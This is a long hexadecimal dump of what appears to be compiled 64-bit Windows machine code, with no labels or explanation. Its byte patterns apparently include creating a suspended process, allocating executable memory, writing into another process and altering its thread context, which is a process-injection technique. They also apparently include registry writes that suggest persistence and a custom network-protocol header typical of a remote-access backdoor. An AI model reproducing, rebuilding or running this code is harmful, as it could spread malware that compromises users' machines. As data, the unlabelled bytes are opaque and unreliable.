CCCCCCCCCCC48895C24084889742410574883EC20488BF94881C168020000E8920F0000488D8FB8010000FF15B5310100488B8F00020000FF1510320100488B8F08020000FF1503320100488B8F10020000FF15F631010033F639B7E00100007E5B0F1F40004C8B87E80100004C3B87F00100007411498B4008488987E801000048897010EB134D85C074314889B7E80100004889B7F00100004D85C0741E4989700849897010FF8FE0010000498B0833D2488B09FF159B320100EBA9488D8FE8000000E81DC6FFFF488B8FB80000004885C97406FF156B3201004C8B87D0000000488B97C80000008B8FC0000000FF15E9300100488D8FA8000000488987B8000000E89E0D0000488B4F406689B7B000000089B718020000C7878C00000003000000FF15D5300100488D8FB8010000488B5C2430488B7424384883C4205F48FF254831010040534883EC604883797800488BD90F84EC0000003B91800000000F84C8000000488B8908020000FF158B3001004C8B5B784C895C247066660F1F8400000000004533C0488D5424704183C9FF418D4801C7442420FF040000FF155233010083F8017554488D4C24304533C94533C033D289442420FF152633010085C074C26690488D4C2430FF151D330100488D4C2430FF15FA320100488D4C24304533C94533C033D2C744242001000000FF15EF32010085C075CBEB8985C0742D3D02010000741083F8FF7416B905400080E85FC2FFFFCCB9B4050000FF1513300100B905400080E849C2FFFFCC488B4B78FF15E62F01004533DB4C895B7844899B800000004883C4605BC3CCCCCCCCCCCCCCCCCCCC48895C24104889742418574883EC20488BF94881C1B8010000488BF2FF156E2F0100448B9F880000004585DB7522488D8FB8010000FF15FD2F0100B89F130000488B5C2438488B7424404883C4205FC333D248896C24308BAF18020000488B46088B48302B4828018F18020000488B4E0848895608488B87F00100004885C0741148894808488B87F001000048894110EB0F488951104889510848898FE8010000FF87E001000048898FF0010000488D8FB8010000FF157D2F010085ED488B6C243075178B871802000085C07E0D488B8F00020000FF15CD2E0100488B5C2438488B74244033C04883C4205FC3CCCCCC48895C2408574883EC30488BFA488BD94885D2747D8B818800000085C0746C4881C1B800000048894C2420E860C2FFFF41B80C000000488BC8488BD74889442428E8DAC1FFFF488D542420488BCBE8BDFEFFFF488B7C24288BD84885FF7426488B4C2420488BD74883C130E8D0C3FFFF85C07511488B0F4C8BC733D2488B09FF158B2F010085DB7416EB0CBB9F130000EB05BB570000008BCBFF15512E010033C085DB488B5C24400F94C04883C4305FC3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC48895C24084889742410574883EC30498BD98BFA488BF14885C90F849D0000008D42FF3D970500000F878F000000418B818800000085C0747D498D89B800000048894C2420E886C1FFFF448BC7488BC8488BD64889442428E803C1FFFF488D542420488BCBE8E6FDFFFF488B7C24288BD84885FF7426488B4C2420488BD74883C130E8F9C2FFFF85C07511488B0F4C8BC733D2488B09FF15B42E010085DB7522488B5C2440488B7424484883C4305F48FF25FA300100BB9F130000EB05BB570000008BCBFF15662D0100488B5C2440488B74244833C04883C4305FC3CCCCCCCC33C0874120C3CCCCCCCCCCCCCCCCCCCC48895C24104889742418574883EC30488BD9488B4908418BF8488BF2FF15362D0100488B8B58030000FF15292D0100FF15F32F010089431C33C087432033C04889433066894338488B431C488943308B838C00000066C74338CA0183F8037408488BCBE8C8F9FFFF440FB7C7488BD6488BCBE829EBFFFF488B8B58030000BA70170000FF15772C010085C0742B3D02010000740583F8FF750D488B8B58030000FF15B22C010032C0488B5C2448488B7424504883C4305FC3B801000000874320488B8B58030000FF158B2C01004C8D5C24404C8D05370000004C895C24284C8BCB33D233C9C744242000000000E89A400000488B74245048898360030000488B5C2448B0014883C4305FC3CCCCCCCCCC40534883EC2083792000488BD9C6442430C90F8424010000488974243848897C244033F68BFE397320742BB964000000FF15CA2B0100FFC783FF647CE93973207414488B03488D54243041B801000000488BCBFF5010FF15BC2E01002B431C3D307500000F86BF0000008B838C00000083F8030F84B0000000FF15A12B0100488BCB8BF8E877ECFFFF85C00F84980000008BD7488BCBE8A5FAFFFF8B838800000085C074233973547418488B4B584533C9488D1598530100458D4110FF15BE2E010089B388000000397348741A488B4B68E8DADCFFFF488B4B08FF15182B0100448BDE44875B20488B4B604885C9740AFF15C22E010048897360488B4B584883F9FF741DBA01000000FF15892E0100488B4B58FF15572E010048C74358FFFFFFFF488BCBE8D7F8FFFF3973200F85F2FEFFFF488B7C2440488B74243833C04883C4205BC3CCCCCCCCCCCCCCCCCCCCCCCC40574883EC5048895C24604C896424484C897424384C897C2430458BF0488BF94C8BFAFF15A72A01003947147415669041B90100000044874F104183F90174F0894714FF47184883BF4003000000458D660E750433C0EB0C8B87480300002B874003000083C00448896C246848897424703B87500300000F8299000000660FEFC04C896C2440F2480F2AC0F20F59050D560100E82CC2000033C941B800100000448D4904F24C0F2CE841C1E50A418BD5FF155A2B0100488B9740030000488BF04885D2750433C9EB088B8F480300002BCA8BE9448BC1488BC8E872340000488B8F400300004885C9740E33D241B800800000FF15282B0100488D042E4489AF500300004C8B6C2440488987480300004889B740030000488B874803000044892048838748030000044883BF4003000000750433C0EB0C8B87480300002B874003000083C00A3B87500300000F828F000000660FEFC0F2480F2AC0F20F59053E550100E85DC1000033C941B800100000448D4904F24C0F2CE041C1E40A418BD4FF158B2A0100488B9740030000488BF04885D2750433C9EB088B8F480300002BCA8BE9448BC1488BC8E8A3330000488B8F400300004885C9740E33D241B800800000FF15592A0100488D042E4889B7400300004489A75003000048898748030000488B4730488B8F48030000488D57304889010FB74208488954242066894108488387480300000A488D8F3803000041B901000000458BC6498BD7E8B1B8FFFF4883BF40030000004C8B7C24304C8B7424384C8B642448488B742470488B6C246875054533C0EB0E448B8748030000442B8740030000488B9740030000488BCFE84C0000004C8B9F40030000488D8F38030000BA000400004C899F48030000E8BDB9FFFFFF1547280100488B5C24603B4714B801000000750DFF4F18750848C74710000000004883C4505FC3CCCCCCCCCC48895C241048896C2418565741554883EC204533ED418BE8488BDA488BF94181F8A00F00000F82C5000000B8D34D6210BE9F130000F7E5C1EA0885D2746A448BEA4C89642440448BE24569EDA00F00004885DB743581BF44020000A00F00007C298B878800000085C0741B488D8F6802000041B8A00F0000488BD3E8F005000085C07413EB098BC6EB05B8570000008BC8FF15992701004881C3A00F000049FFCC75AD4C8B642440412BED81FDA00F00000F837E00000085ED747A4885DB746885ED7E643BAF440200007F5C8B878800000085C07457488D8F68020000448BC5488BD3E8880500008BF085C0753FEB454885D274334585C07E2E443B81440200007F258B818800000085C074144881C168020000E8570500008BF085C0750EEB14BE9F130000EB05BE570000008BCEFF15FB260100488B5C2448488B6C2450B8010000004883C420415D5F5EC3CCCCCC40534883EC20488BD9488B490883CAFFFF158A260100488B8B6003000083CAFFFF157A260100B958020000FF157F260100448B9B8C0000004183FB037408488BCBE88AF3FFFF488B4B08FF1578260100488B8B58030000FF156B2601004C8B5B28B92C01000041C74310010000004883C4205B48FF2536260100CCCCCCCCCCCC8B4120C3CCCCCCCCCCCCCCCCCCCCCCCC48897C242041544883EC404C8BE14533C94881C1F80200000F2974243048C744242000000000E815B6FFFFF20F1035DD51010048895C245048896C245848897424606666666666660F1F8400000000004983BC2400030000000F843F020000418B842408030000412B84240003000083F80E0F8E260200004D8B8C24000300004D8B442430498D6C24304D3B41047510440FB7450866453B410C750433C9EB051BC983D9FF85C90F85CF010000418B3185F60F84E60100003BC60F8CDE010000FF1572280100498D8C2418030000BA00040000418944241C498B8424200300004989842428030000E8C3B6FFFF498B942400030000448D46F2498D8C24180300004883C20E41B90100000048896C2420E82BB5FFFF4983BC24200300000075054533C0EB10458B842428030000452B842420030000498B4C2428498B942420030000488B01FF10418B9424100300003BF20F87F9FEFFFF498B8424000300004885C0750433C9EB0A418B8C24080300002BC83BF1760F4885C07436418BB424080300002BF085F6741B2BD68BDE488BC8448BC2488D1418E8242F000049299C2408030000498B8424000300004885C0750433C9EB0A418B8C24080300002BC84885C07418418B842408030000412B8424000300003BC80F8274FEFFFF660FEFC08BC1F2480F2AC0F20F59C6E844BC0000F2480F2CF0C1E60A413BB424100300000F824AFEFFFF33C98BD641B800100000448D4904FF1566250100498B942400030000488BE84885D2750433C9EB0A418B8C24080300002BCA8BD9448BC1488BC8E87B2E0000498B8C240003000033D241B800800000FF1535250100488D042B4989AC240003000049898424080300004189B42410030000E9D4FDFFFF498B842400030000498D8C24F8020000BA000400004989842408030000E812B5FFFF488B742460488B6C2458488B5C24500F28742430488B7C246833C04883C440415CC348895C2408574883EC20488B01488BD98378F000488B78E8488D50E87456837A10007D298378F4007D0BB957000780E89CB5FFFFCCC740F000000000488B01C60000488B5C24304883C4205FC383C8FFF00FC14210FFC885C07F09488B0A488B01FF5008488B07488BCFFF50184883C018488903488B5C24304883C4205FC3CC48895C2410574883EC20498BF9488BD9488951084C894110FF15DA25010089442430B801000000F00FC1442430FFC08943287510B801000000F00FC1442430FFC0894328488BD7488BCBE8810700004C8B1B488BD7488BCB41FF13FF1597250100488BCB89432489431C33C0894320894318C7433001000000E882010000488BC3488B5C24384883C4205FC3CCCCCCCC40564883EC2083793000488BF1750833C04883C4205EC34883C13848895C243048897C2438FF1505220100488D4E60FF15FB210100837E30007526488D4E60FF1593220100488D4E38FF1589220100488B5C2430488B7C243833C04883C4205EC3488B8E88000000C74630000000004885C97410E8E7BAFFFF48C7868800000000000000488D4E60FF154A220100488D4E38FF15402201004C8B1E488BCE41FF5308488B5C2430488B7C2438B8010000004883C4205EC3CCCCCCCCCCCCCCCCCC48896C24104889742418574883EC2083793002418BF0488BEA488BF97415B89F130000488B6C2438488B7424404883C4205FC34883C16048895C2430FF152E210100837F30027411488D4F60FF15C6210100B89F130000EB39488B8F88000000448BC6488BD5E845BEFFFF488D4F608BF0B8B605000085F60F45F0FF159721010085F6750B8D5601488BCFE8C00100008BC6488B5C2430488B6C2438488B7424404883C4205FC3CCCCCCCCCCCCCCCCCC40555657415441554883EC3048C7442420FEFFFFFF48895C24704C8BE9837930007512B99F130000FF15E220010033C0E95801000048C744246000000000488D593848895C2468488BCBFF15702001009041837D30007524B99F130000FF15AD20010090488BCBFF15FB2001009033C9E8DB35000033C0E911010000FF15762301008BF8418B752485C07506FF15662301002BC6498B4D083B81480200007624B9B4050000FF156520010090488BCBFF15B32001009033C9E89335000033C0E9C90000008BC7418B751C85FF7506FF15242301003BC6791B488BCBFF15872001009033C9E867350000B801000000E99A00000041FF4520418B55204D8B8588000000418B40500FAFC2B9D00700003BC1730E8D420141894520418B48500FAFC88D04394189451C41837D3002400F94C6418B6D2C418B7D28B90C000000E8EA2900004C8BE0B84FBB0000664189042441C644240201418874240341897C240441896C240833C9E8E534000090488BCBFF15F31F0100498BD4498B4D08E89FF0FFFF8BD8498BCCE8C53400008BC3488B5C24704883C430415D415C5F5E5DC3CCCC48895C2418574883EC20837930028BFA488BD97418B99F130000FF15501F010033C0488B5C24404883C4205FC34883C13848896C24304889742438FF155F1F010085C00F84B2000000488D4B60FF154D1F010085C00F8496000000837B30027423B99F130000FF15041F0100488D4B60FF15521F0100488D4B38FF15481F010033C0EB7C85FF7409488B8B88000000EB51FF15C1210100488B8B8800000083797000448BD889414C750AC74170010000008941542B41543D102700007D0D3DF0D8FFFF7C0685C0781EEB04448959548B5150015154443B59547807428D041A894154E879C6FFFF488D4B60FF15D71E0100488D4B38FF15CD1E0100B801000000488B6C2430488B742438488B5C24404883C4205FC3CCCCCCCCCCCCCCCCCCCCCC48896C2410488974241848897C242041544883EC300FB702440FB662038B6A048B7A08488BF10FB64A02BA4FBB000066894424204488642423884C2422896C2424897C2428663BC20F852B01000080F9010F852201000041F6C4FE0F8518010000488D4E3848895C2440FF15901D01008B463085C07507B99F130000EB3B83F802754D3B6E2C752C3B7E280F84C000000085FF751F8B7E24FF159A200100488B4E088B91480200002BC703D23BC20F869D000000B946270000FF15E9200100488D4E38FF15DF1D0100B802000000EB5E8B462C85C07515896E2CFF1558200100C746200000000089461CEB043BE875C43B7E287554488B4E10488B7E08C7463002000000488B4968E8C3CEFFFF488B8F58030000FF15FE1C0100B801000000488D4E38874720FF157C1D010033C0488B5C2440488B6C2448488B742450488B7C24584883C430415CC385FF0F8563FFFFFF488D4E38FF154D1D0100837E1800750E4180FC017508B801000000894618488BCEE8C9FBFFFFEBB3B90D000000FF1524200100B802000000EBA8CCCCCCCCCC40565741544883EC3048C7442420FEFFFFFF48895C245848896C2460498BF1418BE84C8BE2488BF983793002740AB801000000E92D010000488D593848895C2450488BCBFF15261C010090837F3002741FB99F130000FF15BC1F010090488BCBFF15B21C0100B802000000E9F500000083FD187D1FB90D000000FF15981F010090488BCBFF158E1C0100B802000000E9D1000000448BC5498BD4488B8F88000000E81ABFFFFF85C0741FB90D000000FF15631F010090488BCBFF15591C0100B802000000E99C0000008B6C2470448BC5488BD6488B8F88000000E8C1B6FFFF85C0784966666666660F1F840000000000448BC0488BD6488B4F08E871F5FFFF83F8027418448BC5488BD6488B8F88000000E88AB6FFFF85C079D6EB10488BCBFF15F31B0100B802000000EB3983F8FD751CB9B6050000FF15DC1E010090488BCBFF15D21B0100B802000000EB18488BCBFF15C21B0100BA01000000488BCFE8EDFBFFFF33C0488B5C2458488B6C24604883C430415C5F5EC3CCCCCCCCCCCCCCCC48895C24084889742410574883EC20488BD9488B898800000033F6488BFA4885C9740CE8F8B3FFFF4889B388000000488B53108B4B2889732CE832B2FFFF8BD648898388000000395704448B47088B4F0C0F95C23937400F95C64C8BD885F6781689706C41B91E000000B864000000410F45C14189433485C9781CB8881300003BC87F0F41B90A0000008BC1413BC9410F4CC1418943504585C07807458983E800000085D27807418993F0000000488B8B880000008B57148B47104885C9741885C07E0389413885D27E0DB8800000003BD00F43C289413C8B571C488B8B88000000E819CBFFFF8B47184C8B9B88000000488B74243841894334488B8B880000008B47208981EC000000488B8388000000488B5C2430488D0DF3EBFFFF488988000100004883C4205FC3CCCCCCCCCCCC488B09E9482F0000CCCCCCCCCCCCCCCC48895C2418574883EC50488BD98B0D65B30100E8C8070000488D3DA1BB010083F8FF74178BC841B8A0120000488BD748030D82BB0100E835240000488D442468488D153143010041B9020100004533C048C7C1020000804889442420FF1516190100488B4C2468488D1522430100FF150C190100488B4C2468488D151043010041B9030000004533C0C7442428A012000048897C2420FF15FC180100488B4C2468FF15C9180100837B2800746733C048894424304889442438488944244066908B0DB2B20100488D542430E82005000085C074EC448B44244033D2B900040000FF15521A01004885C074D5488D542460488BC8FF156719010085C074C3817C24600301000075B9B9B80B0000FF15BE180100EBC0FF159EBA0100488B5C247033C04883C4505FC3CCCCCCCCCCCCCCCCCC48895C2408574883EC20488D05B7420100488BF98BDA488901488B4930FF1595180100488B4F184C8D1D7A4101004C891FFF1581180100F6C3017408488BCFE8B0220000488BC7488B5C24304883C4205FC3CCCCCCCCCCCCCCCCCCCCCCCCCCCC40534883EC20488D055B420100488BD9488901488B4930FF153B180100488B4B184C8D1D204101004C891B4883C4205B48FF2521180100CCCCCCCCCCCCCCCCCC40555657488DAC2470F6FFFF4881EC900A0000803AC9488BF2488BF90F84EA03000048899C24B00A00004183F8650F8592020000488D442430488D15A041010033DB41B9190002004533C048C7C1010000804889442420C785C809000003000000899DB8090000FF153B17010085C00F85F5000000488B4C2430488D85B80900004C8D8DC80900004889442428488D15BC4001004533C048895C2420FF1516170100448B9DB80900004181FB440A00000F86A9000000418BCB4C89A424C00A0000E886210000448B85B809000033D2488BC84C8BE0E8864E0000488B4C24304C8D9DB80900004C895C24284C8D8DC8090000488D15574001004533C04C89642420FF15B116010085C0754C488D0D8EAE0100498BD441B8440A0000E88021000048631581B00100448D4B4033C941B800300000FF15271801004C630568B00100498D9424440A0000488BC848890596B80100E8492100004C8BA424C00A0000488B4C2430FF1536160100488D46014C8D0537B001004C2BC00F1F8400000000000FB710420FB70C002BD175084883C00285C975EC85D20F8434020000488B0D45B801004885C9741533D241B800800000FF15BA17010048891D2BB80100B87B760000488D4C245E33D26689442444B8555F000041B8E40100006689442446B8216A0000895C24406689442448B857570000BE64000000668944244AB85F000000C744244C2E0064006689442454B862000000C74424506C006C006689442456B869000000C744245A6E0000006689442458E82A4D00004533DB488D8D4C010000448BC633D26644899D4201000048C7854401000001000000E8034D0000488D8DB001000033D241B8D0070000E8EF4C00004533DBB9450A000044899D80090000E8C71F0000488D542440488D480141B8440A0000488BD8C60005E801200000837F10007514488B4F0841B8450A0000488BD34C8B0941FF5110488BCBE8931F0000E93E010000488D0DD3AC010048FFC241B8440A0000E8C51F0000486315C6AE010033C9448D494041B800300000FF156C1601004C6305ADAE0100488D96450A0000488BC8488905DCB60100E88F1F00008B3591AE010081C6440A00004863CEE8271F0000488BD84885C00F849D000000488D1568AC0100488BC841B8440A0000E85A1F00004C63055BAE0100488B1594B60100488D8B440A0000E8401F00004C8D85B8090000488D15723E010048C7C101000080FF154514010085C0753A488B8DB8090000488D15C33D0100FF151D140100488B8DB8090000488D15AF3D010041B9030000004533C08974242848895C2420FF150F140100488B8DB8090000FF15DA130100488BCBE8A229000033DB4C8D0559FAFFFF4C8BCF33D233C948895C2428895C2420E890280000B9B80B000048894730FF1505140100488B4F08488B01FF10488B9C24B00A00004881C4900A00005F5E5DC3CCCCCCCCCCCCCCCCCC48895C2420555741544881ECA0060000488B05417501004833C44889842490060000488B2D9FB50100488BDA33D24863F9488D4C2450448D4268E8014B00004533DB488D8C24C00000004C891B4C895B0833D241B8D00400004C895B10E8DE4A00004533E4488D8C249105000033D241B8FE000000C744245068000000C784248C00000001000000664489A424900000004488A42490050000E8A24A0000488D8C2490050000BAFF000000FF15CF1301004C8D0D203D01004C8D842490050000488D15313D0100488D8C24900500004488A42493050000E8B401000048895C2448488D44245048894424404C896424384C89642430488D8C24900500004533C94533C033D2C7442428040000004489642420FF156013010085C00F84A4000000488B0B41B9003000004C8BC733D24889B424D0060000C744242040000000488BF7FF1541130100488BF84885C0745A488B0B4C8BCE4C8BC5488BD04C89642420FF152A13010085C0743F488B4B08488D9424C0000000C78424F00000000B001000FF15D112010085C0741E488B4B08488D9424C00000004889BC24B8010000FF15BB12010085C0750433C0EB0F488B4B08FF15E1120100B801000000488BB424D0060000488B8C24900600004833CCE87C1C0000488B9C24D80600004881C4A0060000415C5F5DC3CCCCCCCCCCCCCCCC48895C2408488974241048897C24184533D24533C94863D985C97E4F488B3DB5B30100488D355E3B0100482BFE0F1F004533C04E8D1C0F33D20F1F80000000000FB60432488D0C324138040B750C48FFC241FFC04883FA0C7CE64183F80C741E49FFC141FFC24C3BCB7CC583C8FF488B5C2408488B742410488B7C2418C3488B5C2408488B742410488B7C2418418BC2C3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC48895424104C894424184C894C24204883EC284C8BC24C8D4C2440BAFF000000E8632900004883C428C3CCCCCCCCCCCC4883EC28488B094885C97415FF152611010085C0750BB905400080E870A3FFFFCC4883C428C3CCCCCCCCCCCCCCCCCCCC48894C2408574883EC3048C7442420FEFFFFFF48895C24484889742450488BD933F648897110897118488D05603C01004889014533C9BA0100000033C9448BC2FF15FA100100488943408BCE4885C00F95C185C9750BB905400080E800A3FFFF90C743480100000048C7434C05000000C743540100000048C74358FFFFFFFF4889736048897368C743703C000000C743743C000000488973784889B38000000089B388000000C7838C000000030000004889B3900000004889B3980000004889B3A0000000488D0DC46F0100488B05BD6F0100FF50184883C018488983A80000006689B3B0000000488DBBB8000000488BCFE8E91500009089B3B0010000488D8BB801000033D2FF152B1101008BCE85C00F95C185C9750BB905400080E83EA2FFFF904889B3E80100004889B3F001000089B3E00100004889BBF80100004533C94533C033D233C9FF15F20F0100488983000200008BCE4885C00F95C185C9750BB905400080E8F5A1FFFF904533C94533C033D233C9FF15C40F0100488983080200008BCE4885C00F95C185C9750BB905400080E8C7A1FFFF904533C94533C033D233C9FF15960F0100488983100200008BCE4885C00F95C185C9750BB905400080E899A1FFFF9089B31802000089B31C020000C7832002000001000000C7832402000001000000C7832802000002000000C7832C0200000A000000C7833002000080000000C7833402000000020000C783380200001E000000C7833C02000098050000C7834002000005000000C7834402000000100000C78348020000881300004889B3500200004889B358020000488D8B68020000E8B415000090488D05D4360100488983F802000089B3100300004889B3000300004889B3080300004889831803000089B3300300004889B3200300004889B3280300004889833803000089B3500300004889B3400300004889B3480300008BC6874320FF154811010089431C4533C94533C0418D510133C9FF156B0E0100488943084533C94533C033D233C9FF15570E01004889835803000089731C8B8B44020000E83E18000048898350020000B998050000E82D180000488983A0000000488BC3488B5C2448488B7424504883C4305FC3CCCCCCCCCCCCCC48895C240848896C2410488974241848897C24204154415541564883EC204D8BE8488BEA4C8BE14885D2741A488BCAFF15CB0D010033D2488BCD8D4400024C63C0E8DA4400004C8D3553810100498BCEFF15AA0D0100498BCC4863D8FF159E0D010033D233C94C8BDB4863F085DB0F8E980000004533D24533C985F67E2C488D1C094D8BC4492BDC4903DE0F1F440000410FB7006642390403750F49FFC141FFC24983C0024C3BCE7CE6443BD6752303D64803CE4863C2493BCB7D160F1F40006641833C4E7C741648FFC1FFC2493BCB7CEE48FFC1FFC2493BCB7C98EB2E4885ED74152BD0488BCD03D24C63C2498D1446E86A170000EB144863C26641837C46FE31750841C7450001000000488B5C2440488B6C2448488B742450488B7C24584883C420415E415D415CC3CCCCCCCCCC488BC44883EC68803D2AC10100000F85E80C0000488958F8488968F0488970E8488978E04C8960D84C8970D0488D2D3D8001004C8978C8C605FAC0010001488BCDE8A6240000488D0D33AE010033D241B8A0120000E896430000488D153DAE0100488D0D603601004533C0E860FEFFFF488D1525B00100488D0D523601004533C0E84AFEFFFF488BCDFF15410C01004C8D3D42360100498BCF4863D8FF152E0C01004533C933D24C8BDB458D71014863F085DB0F8E900000000F1F80000000004533D24533C085F67E31488D1C12492BDF4803DD666666660F1F840000000000430FB704474A8D0C436642390439750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB198B0DA2AF01004963C166837C45FE31410F44CE890D8FAF0100488D158CAF0100488D0D893501004533C0E871FDFFFF488D1574B10100488D0D7B3501004533C0E85BFDFFFF488BCDFF15520B01004C8D256B350100498BCC4863D8FF153F0B01004533C933D24C8BDB4863F085DB0F8E850000004533D24533C085F67E2D488D1C12492BDC4803DD0F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C96EB198B0D02B101004963C166837C45FE31410F44CE890DEFB00100488D15ECB00100488D0DC13401004533C0E891FCFFFF488D15D4B20100488D0DB33401004533C0E87BFCFFFF488BCDFF15720A01004C8D35A3340100498BCE4863D8FF155F0A01004533C933D24C8BDB4863F085DB0F8E890000004533D24533C085F67E2D488D1C12492BDE4803DD0F1F840000000000430FB704464A8D0C436642390431750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C96EB1D8B0D62B201004963C166837C45FE31B8010000000F44C8890D4BB20100488D1548B20100488D0DF53301004533C0E8ADFBFFFF488D156EB20100488D0DE73301004533C0E897FBFFFF488D1594B20100488D0DD93301004533C0E881FBFFFF488D15E2B20100488D0DCB3301004533C0E86BFBFFFF488D1530B30100488D0DBD3301004533C0E855FBFFFF488BCDFF154C0901004C8D25AD330100498BCC4863D8FF15390901004533C933D24C8BDB4863F085DB0F8E93000000660F1F4400004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0DDAB201004963C166837C45FE31B8010000000F44C8890DC3B20100488BCDFF158A0801004C8D25F3320100498BCC4863D8FF15770801004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0D1EB201004963C166837C45FE31B8010000000F44C8890D07B20100488BCDFF15CA0701004C8D253B320100498BCC4863D8FF15B70701004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0D62B101004963C166837C45FE31B8010000000F44C8890D4BB10100488BCDFF150A0701004C8D2583310100498BCC4863D8FF15F70601004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0DA6B001004963C166837C45FE31B8010000000F44C8890D8FB00100488BCDFF154A0601004C8D25CB300100498BCC4863D8FF15370601004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0DEAAF01004963C166837C45FE31B8010000000F44C8890DD3AF0100488BCDFF158A0501004C8D2513300100498BCC4863D8FF15770501004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0D2EAF01004963C166837C45FE31B8010000000F44C8890D17AF0100488BCDFF15CA0401004C8D255B2F0100498BCC4863D8FF15B70401004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0D72AE01004963C166837C45FE31B8010000000F44C8890D5BAE0100488BCDFF150A0401004C8D25A32E0100498BCC4863D8FF15F70301004533C933D24C8BDB4863F085DB0F8E910000000F1F40004533D24533C085F67E31488D1C12492BDC4803DD666666660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C92EB1D8B0DB6AD01004963C166837C45FE31B8010000000F44C8890D9FAD0100488D842480000000488D15EC2D010041B9190002004533C048C7C101000080C7442478030000004889442420C744247000000000FF158102010085C07530488B8C2480000000488D4424704C8D4C24784889442428488D15AF2D01004533C048C744242000000000FF155D020100837C24700A0F86E302000033D241B8D0070000488BCDE8EA390000488B8C24800000004C8D5C24704C895C24284C8D4C2478488D15642D01004533C048896C2420FF1516020100488D1565A40100488D0D882C01004533C0E888F4FFFF488D154DA60100488D0D7A2C01004533C0E872F4FFFF488BCDFF1569020100498BCF4863D8FF155D0201004533C933D24C8BDB4863F085DB7E704533D24533C085F67E2F488D1C12492BDF4803DD66660F1F840000000000430FB704474A8D0C436642390439750B49FFC041FFC24C3BC67CE5443BD675274803D64403CE493BD37D1C0F1F44000066837C55007C0F84E400000048FFC241FFC1493BD37CE948FFC241FFC1493BD37C9041BF01000000488D15DDA50100488D0DDA2B01004533C0E8C2F3FFFF488D15C5A70100488D0DCC2B01004533C0E8ACF3FFFF488BCDFF15A30101004C8D25BC2B0100498BCC4863D8FF15900101004533C933D24C8BDB4863F085DB0F8EAA0000004533D24533C085F67E2E488D1C12492BDC4803DD660F1F840000000000430FB704444A8D0C436642390421750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C743C48FFC241FFC1493BD37CED48FFC241FFC1493BD37C95EB3D8B0D12A501004963C141BF0100000066837C45FE31410F44CF890DF9A40100E914FFFFFF8B0D2EA701004963C166837C45FE31410F44CF890D1BA70100488D1518A70100488D0DED2A01004533C0E8BDF2FFFF488D1500A90100488D0DDF2A01004533C0E8A7F2FFFF488BCDFF159E000100498BCE4863D8FF15920001004533C933D24C8BDB4863F085DB0F8E880000004533D24533C085F67E30488D1C12492BDE4803DD6666660F1F840000000000430FB704464A8D0C436642390431750B49FFC041FFC24C3BC67CE5443BD675234803D64403CE493BD37D180F1F44000066837C55007C741848FFC241FFC1493BD37CED48FFC241FFC1493BD37C93EB198B0D92A801004963C166837C45FE31410F44CF890D7FA801004C8B7424384C8B642440488B7C2448488B742450488B6C2458488B5C24604C8B7C24304883C468C3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC488BC456574154415541564883EC6048C7442420FEFFFFFF4889580848896818488D0D25A80100E8A417000069C0E80300008BC8FF1546FF00004533E4418BFCB9B8000000E8FE0F00004885C0740D488BC8E8F9B0FFFF488BE8EB03498BECB968030000E8DF0F000048898424980000004885C0740D488BC8E812EEFFFF488BF0EB03498BF44C8D2DFB2701004C8D3514290100E897B0FFFFBAFF000000488D0D2B920100803D6296010000752D4C8D05D9A00100E8361100004C8D05CBA20100BA1E000000488D0D03940100E81E110000448B1DEFA20100EB2B4C8D05EAA20100E8091100004C8D05DCA40100BA1E000000488D0DD6930100E8F1100000448B1D02A50100803D01960100000F9405FA95010044891DA59101008B0543A00100FFC089053BA001003DC8000000754AE8FBAFFFFF4C8D05D0A40100BAFF000000488D0D88910100E8A31000004C8D05B6A60100BA1E000000488D0D70930100E88B100000448B1DDCA6010044891D4D910100448925EA9F01004885FF740F488B07488BCFFF10448B1D32910100488BFE4183FB01480F44FD488D0DE8A60100E82B1